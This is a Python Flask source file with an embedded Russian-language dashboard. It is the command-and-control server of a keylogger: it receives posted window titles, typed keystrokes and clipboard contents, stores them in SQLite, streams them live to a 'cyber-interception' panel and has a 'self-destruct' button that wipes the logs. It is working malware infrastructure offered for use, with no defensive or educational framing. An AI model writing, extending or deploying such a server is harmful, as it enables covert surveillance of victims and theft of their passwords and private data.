import os
import datetime
import sqlite3
from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cyber_secret'
socketio = SocketIO(app, cors_allowed_origins="*")
DB_FILE = "logs.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    conn.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, time TEXT, window TEXT, keys TEXT, clipboard TEXT)")
    conn.commit()
    conn.close()
init_db()

# Тот самый киберпанк-сайт, только вшит прямо в Python
HTML = """
<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"><title>КИБЕР-ПЕРЕХВАТ</title>
<style>
body { background: #050505; color: #00ffcc; font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; }
#main-menu { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; }
.pc-btn { background: #111; border: 2px solid #00ffcc; color: #00ffcc; padding: 30px 60px; font-size: 30px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px rgba(0, 255, 204, 0.4); transition: 0.3s; }
.pc-btn:hover { background: #00ffcc; color: #000; box-shadow: 0 0 40px #00ffcc; }
#dashboard { display: none; width: 100%; max-width: 1200px; flex-direction: column; }
.header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ffcc; padding-bottom: 10px; margin-bottom: 15px; }
.panic-btn { background: #ff0033; color: white; border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px #ff0033; }
#logs { height: 70vh; overflow-y: auto; background: #111; border: 1px solid #333; padding: 15px; white-space: pre-wrap; font-size: 14px; color: #fff; line-height: 1.5; }
.log-window { color: #ffcc00; font-weight: bold; } .log-clipboard { color: #ff00ff; font-style: italic; }
</style></head>
<body><div id="main-menu"><h1>ОЖИДАНИЕ ПОДКЛЮЧЕНИЯ...</h1><button class="pc-btn" onclick="openDashboard()">[ ПК-1 // ПОДКЛЮЧЕН ]</button></div>
<div id="dashboard"><div class="header"><h2>ТРАНСЛЯЦИЯ</h2><button class="panic-btn" onclick="triggerPanic()">🚨 САМОЛИКВИДАЦИЯ 🚨</button></div><div id="logs">Ожидание...</div></div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
<script>
var socket = io(); var logsDiv = document.getElementById('logs');
function openDashboard() { document.getElementById('main-menu').style.display = 'none'; document.getElementById('dashboard').style.display = 'flex'; }
socket.on('new_log', function(data) { var e = document.createElement('div'); e.innerHTML = `<span style="color:#888;">[${data.time}]</span> <span class="log-window">ОКНО: ${data.window}</span> | <span style="color:#fff;">ТЕКСТ: ${data.keys}</span> ${data.clipboard ? `<br><span class="log-clipboard">[БУФЕР] ${data.clipboard}</span>` : ''}`; logsDiv.appendChild(e); logsDiv.scrollTop = logsDiv.scrollHeight; });
socket.on('clear_logs', function() { logsDiv.innerHTML = "Логи очищены..."; });
function triggerPanic() { if(confirm("Удалить логи?")) { fetch('/clear', { method: 'POST' }); } }
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    conn = sqlite3.connect(DB_FILE)
    conn.execute("INSERT INTO logs (time, window, keys, clipboard) VALUES (?, ?, ?, ?)", (datetime.datetime.now().strftime("%H:%M:%S"), data.get('window', ''), data.get('keys', ''), data.get('clipboard', '')))
    conn.commit(); conn.close()
    socketio.emit('new_log', data)
    return jsonify({"status": "ok"})

@app.route('/clear', methods=['POST'])
def clear():
    conn = sqlite3.connect(DB_FILE); conn.execute("DELETE FROM logs"); conn.commit(); conn.close()
    socketio.emit('clear_logs'); return jsonify({"status": "cleared"})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
